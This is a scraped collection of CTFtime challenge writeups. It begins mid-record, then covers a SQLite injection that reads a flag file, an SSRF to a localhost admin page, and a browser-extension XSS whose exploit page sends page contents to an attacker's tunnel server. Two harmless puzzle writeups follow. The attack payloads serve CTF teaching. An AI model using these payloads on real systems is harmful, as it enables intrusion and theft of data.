flag.\n\n\n![1](\nhttps://github.com/NEMO246/WRITEUP_CTF/raw/main/BuckeyeCTF%202025/web/BIG%20CHUNGUS/images/1.png\n)\n\n\n### Flag\n`bctf{b16_chun6u5_w45_n3v3r_7h15_b16}`", "source": "ctftime", "crawled_at": "2025-11-27T17:35:28.437102"}
{"url": "https://ctftime.org/writeup/40482", "title": "Packages", "content": "![Title](\nhttps://github.com/NEMO246/WRITEUP_CTF/raw/main/BuckeyeCTF%202025/web/Packages/images/Title.png\n)\n\n\n### Step 1: Initial Analysis and Source Code Review\n\n\nThe challenge involves exploring Debian and Debian-based packages through a web application at `\nhttps://packages.challs.pwnoh.io\n`. A downloadable `packages.zip` file is provided, containing the source code for the application.\n\n\nUnzipping the file reveals the following components:\n\n\n- **pyproject.toml**: Defines the project as \"sql-injection\" version 0.1.0, with dependencies on Flask and Gunicorn.\n- **uv.lock**: A lockfile listing Python package dependencies, including Flask (3.1.2), Gunicorn (23.0.0), and their transitive dependencies like Jinja2, Werkzeug, etc.\n- **seed.sql**: Creates a SQLite table `packages` and populates it with package data from various Debian (versions 11, 12, 13) and Ubuntu (versions 20.04, 22.04, 24.04) distributions. Data is fetched from official repositories like `\ndeb.debian.org\n` and `\narchive.ubuntu.com\n`.\n- **\nmain.py\n**: The core Flask application code. It sets up a simple web server with a search form for distro and package. It uses SQLite to query the `packages` table based on user input.\n- **Dockerfile**: Builds the container using a base image, compiles SQLite from source, adds the application files, sets up the environment, and runs the app.\n\n\nKey part of `\nmain.py\n` (vulnerable query construction):\n\n\n```python\ndistro = request.args.get(\"distro\", \"\").strip().lower()\npackage = request.args.get(\"package\", \"\").strip().lower()\n\n\nsql = \"SELECT distro, distro_version, package, package_version FROM packages\"\nif distro or package:\n    sql += \" WHERE \"\nif distro:\n    sql += f\"LOWER(distro) = {json.dumps(distro)}\"\nif distro and package:\n    sql += \" AND \"\nif package:\n    sql += f\"LOWER(package) = {json.dumps(package)}\"\nsql += \" ORDER BY distro, distro_version, package\"\n\n\nprint(sql)\nresults = db.execute(sql).fetchall()\n```\n\n\nThe use of `json.dumps` attempts to sanitize inputs by escaping special characters (e.g., `\"` becomes `\\\"`), but this is ineffective for SQLite. In SQLite, backslashes (`\\`) are not treated as escape characters in string literals—doubling the quote (e.g., `\"\"` for `\"`) is required instead. This mismatch allows SQL injection by breaking out of the string literal.\n\n\nThe database connection is persistent (`check_same_thread=False`), so injected queries can leverage available functions.\n\n\nThe goal is to exploit the SQL injection to read the flag from `/app/flag.txt`.\n\n\n### Step 2: Understanding the SQL Injection Vulnerability\n\n\nThe vulnerability lies in how user input for `distro` and `package` is inserted into the SQL query using `json.dumps`. This function is meant for JSON serialization and escapes quotes with backslashes (e.g., `\"` becomes `\\\"`), but SQLite does not interpret backslashes as escapes in strings. To escape a quote in SQLite, it must be doubled (`''` or `\"\"`).\n\n\nFor example, if `distro` is set to `\" OR 1=1 --`, `json.dumps` produces `\"\\\" OR 1=1 --\"`, which SQLite treats as a string containing a literal backslash and quote, not as an escape. However, to inject, we can use a payload that closes the string and injects code.\n\n\nA crafted payload like `dwq\" UNION ALL SELECT 1,2,3,4--` would result in SQL like:\n\n\n`SELECT ... WHERE LOWER(distro) = \"dwq\\\" UNION ALL SELECT 1,2,3,4--\"`\n\n\nBut due to the escaping mismatch, we can adjust to break out properly. Testing shows the `distro` parameter is injectable via UNION queries, as the app renders results in a table, allowing us to observe injected data.\n\n\nThe query structure allows appending arbitrary SQL after closing the string literal. A working injection uses a payload that closes the quote and injects a UNION to select custom values, confirming the vuln.\n\n\n### Step 3: Exploiting the Vulnerability Manually\n\n\nTo read the flag, we use `readfile('/app/flag.txt')`. Since the challenge had multiple solvers (49 solves at the time), the necessary setup was already in place, allowing the injection to succeed directly.\n\n\nUse char() to encode paths, avoiding any potential filtering.\n\n\n**Read the flag** (single request):\n\n\n```\nhttps://packages.challs.pwnoh.io/?distro=dwq\n\"%20UNION%20ALL%20SELECT%20readfile(char(47,97,112,112,47,102,108,97,103,46,116,120,116)),NULL,NULL,NULL--%20IKLP&package=\n```\n\n\nThe flag appears in the \"Distro\" column of the results table.\n\n\n![2](\nhttps://github.com/NEMO246/WRITEUP_CTF/raw/main/BuckeyeCTF%202025/web/Packages/images/1.png\n)\n\n\n### Flag\n`bctf{y0uv3_g0t_4n_apt17ud3_f0r_7h15}`", "source": "ctftime", "crawled_at": "2025-11-27T17:35:31.148903"}
{"url": "https://ctftime.org/writeup/40481", "title": "ebg13", "content": "![Title](\nhttps://github.com/NEMO246/WRITEUP_CTF/raw/main/BuckeyeCTF%202025/web/ebg13/images/Title.png\n)\n\n\n### Step 1: Initial Analysis and Source Code Review\n\n\nThe challenge presents a simple web application that promises to display the ROT13 version of any website. The description itself is encoded in ROT13: `V znqr na ncc gung yrgf lbh ivrj gur ebg13 irefvba bs nal jrofvgr!` decodes to `I made an app that lets you view the rot13 version of any website!`.\n\n\nA zip file with the source code (`server.js`) is provided, which is the key to understanding the application's logic. Analyzing the code reveals two important endpoints:\n\n\n1.  `/ebj13`: This endpoint takes a `url` as a query parameter. It uses `fetch()` to retrieve the content of the provided URL, applies the `rot13` cipher to all text nodes using the `cheerio` library, and then sends the modified HTML back to the user. This is a classic pattern for a **Server-Side Request Forgery (SSRF)** vulnerability.\n\n\n2.  `/admin`: This is a hidden endpoint that contains the flag. Access is restricted by an IP check. It will only reveal the flag if the request originates from `localhost` (`127.0.0.1`). Any other IP will be rejected.\n\n\n```javascript\nfastify.get('/admin', async (req, reply) => {\n    if (req.ip === \"127.0.0.1\" || req.ip === \"::1\" || req.ip === \"::ffff:127.0.0.1\") {\n      return reply.type('text/html').send(`Hello self! The flag is ${FLAG}.`)\n    }\n\n\n    return reply.type('text/html').send(`Hello ${req.ip}, I won't give you the flag!`)\n})\n```\n\n\n### Step 2: Crafting the SSRF Payload\n\n\nThe goal is to exploit the SSRF vulnerability in the `/ebj13` endpoint to make the server send a request to its own `/admin` endpoint. This will bypass the IP address restriction.\n\n\nFrom the source code, we know the application is running on port `3000`:\n`fastify.listen({ port: 3000, host: '0.0.0.0' })`\n\n\nTherefore, the internal URL we need the server to request is `http://127.0.0.1:3000/admin`.\n\n\nWe can pass this internal URL as the `url` parameter to the main `/ebj13` endpoint. This will form our final payload.\n\n\n**Payload:**\n```\nhttps://ebg13.challs.pwnoh.io/ebj13?url=http://127.0.0.1:3000/admin\n```\n![1](\nhttps://github.com/NEMO246/WRITEUP_CTF/raw/main/BuckeyeCTF%202025/web/ebg13/images/1.png\n) \n\n\n### Step 3: Exploitation and Retrieving the Flag\n\n\nSubmitting the crafted URL instructs the server to perform the following actions:\n\n\n1.  The `/ebj13` endpoint receives our request with the `url` parameter pointing to its own `/admin` page.\n2.  The server's `fetch()` function makes a request to `http://127.0.0.1:3000/admin`.\n3.  Because this request originates from the server itself, its source IP is `127.0.0.1`.\n4.  The IP check in the `/admin` endpoint passes, and it returns the success message containing the flag.\n5.  The `/ebj13` function receives this response. Although it's supposed to apply ROT13, the simple text response from `/admin` isn't processed by the `cheerio` HTML parser, so the cipher is not applied.\n6.  The server returns the unmodified content from the `/admin` page directly to us, revealing the flag in cleartext.\n\n\n![2](\nhttps://github.com/NEMO246/WRITEUP_CTF/raw/main/BuckeyeCTF%202025/web/ebg13/images/2.png\n) \n\n\n### Flag\n`bctf{what_happens_if_i_use_this_website_on_itself}`", "source": "ctftime", "crawled_at": "2025-11-27T17:35:33.798706"}
{"url": "https://ctftime.org/writeup/40475", "title": "MÅRQUEE", "content": "# \nHack.lu\n CTF 2025 MARQUEE Writeup (Web)\n\n\nwriteup: **fridgebuyer**\n\n\nCategory: **Web**\n\n\n## Challenge Overview\nThe challenge involves exploiting a browser extension called \"TagDeprecater\" that removes deprecated HTML tags from web pages. A bot visits a user-supplied URL with this extension loaded, and the flag is served on http://localhost:1337 inside a <marquee> tag.\n\n\n## Vulnerability Analysis\n\n\n### 1. No Origin Validation in postMessage Handler (popup.js:28-37)\nThe extension popup listens for postMessage events without validating the origin:\n```javascript\nwindow.addEventListener(\"message\", (event) => {\n    if (event.data.type === 'SET') {\n        chrome.storage.sync.set({ replacementString: event.data.replacementString });\n    }\n});\n```\nAny page that can access the popup window can send it messages and set arbitrary replacementString values.\n\n\n### 2. All Resources are Web-Accessible (manifest.json:35-44)\n```json\n\"web_accessible_resources\": [{\n    \"resources\": [\"*\"],\n    \"matches\": [\"<all_urls>\"]\n}]\n```\nThis allows any website to iframe the extension's popup.html, making it accessible for postMessage communication.\n\n\n### 3. DOM-based XSS via outerHTML Assignment (content.js:34)\n```javascript\nelements.forEach((el) => {\n    el.outerHTML = replacementString;\n});\n```\nThe content script replaces deprecated tags using unsanitized HTML assignment. If replacementString contains HTML with inline event handlers, it will execute JavaScript.\n\n\n## Extension ID Calculation\nChrome generates deterministic extension IDs for unpacked extensions based on the path:\n- Path: /app/TagDeprecater\n- Extension ID: pnalnbkfknoddllnlcbifndnghnlggjl\n\n\nThe ID is calculated by taking the SHA256 hash of the absolute path and converting the first 128 bits to the 'a'-'p' alphabet (32 characters).\n\n\n## Attack Flow\n\n\n1. Victim bot visits attacker's malicious webpage\n2. Malicious page creates a hidden iframe to the extension's popup.html using the calculated extension ID\n3. Malicious page sends a postMessage to the iframe with type 'SET' and a malicious replacementString\n4. The popup accepts the message and stores the malicious string in chrome.storage.sync\n5. Malicious page redirects to http://localhost:1337\n6. Content script runs on localhost:1337, finds the <marquee> tag containing the flag\n7. Content script replaces <marquee> with the malicious replacementString\n8. The XSS payload executes and exfiltrates the flag to attacker's server\n\n\n## The Timing Challenge\n\n\nInitial attempts to exfiltrate the flag directly from document.body.innerText failed because:\n- When el.outerHTML = replacementString executes, it replaces the entire <marquee> element AND its children\n- By the time the XSS payload's onerror handler executes, the flag text is already gone\n- The marquee element no longer exists in the DOM\n\n\n## Solution: Iframe Re-fetch Technique\n\n\nThe successful approach uses an iframe to re-fetch the flag page:\n\n\n```javascript\nconst payload = `<iframe src=\"http://localhost:1337\" onload=\"fetch('${EXFIL_SERVER}/?flag='+encodeURIComponent(this.contentDocument.body.innerText))\" style=\"display:none\"></iframe>`;\n```\n\n\nThis works because:\n1. The injected iframe makes a NEW request to localhost:1337\n2. That fresh page load contains its own <marquee> tag with the flag\n3. The onload handler can read this.contentDocument.body.innerText before the content script processes it\n4. The flag is successfully exfiltrated to the attacker's webhook server\n\n\n## Exploit Setup\n\n\n### Infrastructure:\n1. Webhook server (Python): Listens on port 8000 to receive exfiltrated data\n2. Cloudflare tunnel: Exposes local webhook server publicly\n3. Web server: Serves exploit.html on port 80\n\n\n### Steps:\n1. Start webhook server: `python3 \nwebhook_server.py\n`\n2. Create public tunnel: `cloudflared tunnel --url http://localhost:8000`\n3. Update exploit_clean.html with the cloudflare tunnel URL\n4. Serve exploit from web server on port 80\n5. Submit exploit URL to CTF bot\n6. Bot visits exploit, gets pwned, flag exfiltrated to webhook\n\n\n## Exploit Code (exploit_clean.html)\n\n\n```html\n\n\n<html>\n<head>\n    <title>MARQUEE Exploit</title>\n</head>\n<body>\n    <h1>TagDeprecater Exploit</h1>\n    <script>\n        const EXTENSION_ID = 'pnalnbkfknoddllnlcbifndnghnlggjl';\n        const EXFIL_SERVER = 'https://********.trycloudflare.com';\n\n\n        const payload = `<iframe src=\"http://localhost:1337\" onload=\"fetch('${EXFIL_SERVER}/?flag='+encodeURIComponent(this.contentDocument.body.innerText))\" style=\"display:none\"></iframe>`;\n\n\n        const iframe = document.createElement('iframe');\n        iframe.src = `chrome-extension://${EXTENSION_ID}/popup.html`;\n        iframe.style.display = 'none';\n        document.body.appendChild(iframe);\n\n\n        iframe.onload = () => {\n            iframe.contentWindow.postMessage({\n                type: 'SET',\n                replacementString: payload\n            }, '*');\n\n\n            setTimeout(() => {\n                window.location.href = 'http://localhost:1337';\n            }, 1000);\n        };\n    </script>\n</body>\n</html>\n```\n\n\n## Flag\n```\n=======================\nWEBHOOK RECEIVED!\n=======================\nPath: /?flag=flag%7Bextension_rebellion_v3%7D\nParameters: {\n  \"flag\": [\n    \"flag{extension_rebellion_v3}\"\n  ]\n}\n\n\n? FLAG CAPTURED:\n   flag{extension_rebellion_v3}\n\n\n=======================\n```", "source": "ctftime", "crawled_at": "2025-11-27T17:35:49.388059"}
{"url": "https://ctftime.org/writeup/40474", "title": "Tiny Flag", "content": "# V1tCTF 2025: Tiny Flag\n\n\nWriteup Author: `Duc(k) Nguyen` (`duke7012` a.k.a. `Duke` a.k.a. `SubierThumb`)\n\n\n## Description\n\n\n* Challenge author: `unknown`\n* Category: `Web`\n* Point value: `100`\n\n\n![Description](\nhttps://i.imgur.com/0VfthNh.png\n)\n\n\n> Do you see the tiny flag :>\n> \n> \nhttps://tommytheduck.github.io/tiny_flag/\n\n\nWebsite(s):\n\n\n* \nhttps://tommytheduck.github.io/tiny_flag/\n\n\n## Tools used\n\n\n* Google Chrome\n    * _Alternative:_ Any browser with the inspection feature.\n\n\n## Initial Analysis\n\n\nThe website is mostly blank. I tried to highlight the empty space in the middle, and got this text: `Tiny flag — look closely ✨`. However, this text looks normal. I tried some stegnographic decoder, but I just realized that this is a Web challenge, so nothing to do with stegno.\n\n\n![Screenshot](\nhttps://i.imgur.com/bK025pR.png\n)\n\n\nWhen I look at the website again, I saw the word `Inspect me` in the middle of the website, so I tried to inspect it.\n\n\n![Screenshot](\nhttps://i.imgur.com/7jbhDRT.png\n)\n\n\nThere is nothing seemed weird to me, so I decided to press all the links available in the HTML code, to make sure nothing is hidden in the files. As I pressed to the very first link `favicon.ico`, the website icon file, I saw something weird...\n\n\n![Screenshot](\nhttps://i.imgur.com/Uihs34v.png\n)\n\n\nIt looks like a text... Let's zoom it in...\n\n\n![Screenshot](\nhttps://i.imgur.com/2YZFQNo.png\n)\n\n\nNo doubt! It's a flag! Quack quack.\n\n\n## Solution\n\n\n`v1t{T1NY_ICO}`\n\n\n## Rating\n_**Like**: Cool challenge for Web beginner! Also, MCK is a famous rapper in Vietnam, so if you are interested, you can find more songs from him online :D_", "source": "ctftime", "crawled_at": "2025-11-27T17:35:52.175289"}
{"url": "https://ctftime.org/writeup/40473", "title": "Talking Duck", "content": "# V1tCTF 2025: Talking Duck\n\n\nWriteup Author: `Duc(k) Nguyen` (`duke7012` a.k.a. `Duke` a.k.a. `SubierThumb`)\n\n\n## Description\n\n\n* Challenge author: `Rawr`\n* Category: `Misc`\n* Point value: `100`\n\n\n![Description](\nhttps://i.imgur.com/YviwRjA.png\n)\n\n\n> Bro this duck is talking to me or something ? I'm high or what ??\n> \n> Attachment: \nhttps://drive.google.com/file/d/1XOVJwPqHTZBRRUiuve8E1VwBSmMyB4Us/view?usp=sharing\n\n\nFiles:\n\n\n* [`duck_sound.wav` (Original link)](\nhttps://drive.google.com/file/d/1XOVJwPqHTZBRRUiuve8E1VwBSmMyB4Us/view?usp=sharing\n)\n* [`duck_sound.wav` (Backup link)](\nhttps://transfer.it/t/1nuyqohxTJLT\n)\n\n\n## Tools used\n\n\n* Adobe Audition CC 2026 (PC Application)\n* [Morse Code Translator (Website)](https://morsecode.world/international/translator.html)\n* _Alternative:_ Some other basic sound editing software, such as Audacity.\n\n\n## Initial Analysis\n\n\nWhen I first heard the audio, there is only two kinds of duck audio: (1) very short quack, and (2) very long quack. Since this is a 100-point challenge, the technique to solve should not be too complicated. I decided to analyze the file using Adobe Audition first.\n\n\n![Screenshot](\nhttps://i.imgur.com/p8Ix1AD.jpeg\n)\n\n\nAs you look at the pattern, there is clearly two types of code: short quacks & long quacks, which immediately remind me of Morse code--which also has two main types of code: dots & dashes.\n\n\nBy mapping (1) short quacks = dots and (2) long quacks = dashes, we have the following code (spaces are important too!):\n\n\n`...- .---- -    -.. ..- -.-. -.-    ... ----- ...  ... ----- ...`\n\n\nUsing the [Morse Code Translator Website](https://morsecode.world/international/translator.html), we have the decoded message as followed:\n\n\n![Screenshot](\nhttps://i.imgur.com/MEK5kLz.png\n)\n\n\nHowever, `V1TDUCKS0SS0S` does not seem to match the flag format `v1t{flag}`.\nI tried around several answer like `v1t{DUCKS0SS0S}` or even `V1TDUCKS0SS0S` itself but it is still not worked.\n\n\nI looked back and noticed some unusual whitespaces in the middle of each chunk of Morse code, so I think it could mean something. I decided to try longer spaces with underscores but still matched with flag format (i.e. `v1t{DUCK_S0S_SOS}`). Turned out it worked ^^!\n\n\nQuack quack.\n\n\n## Solution\n\n\n`v1t{DUCK_S0S_SOS}`\n\n\n## Rating\n_**Dislike**: Due to unclear underscores, it could waste unnecessary time to guess the flag even you solved it out_", "source": "ctftime", "crawled_at": "2025-11-27T17:35:54.762125"}
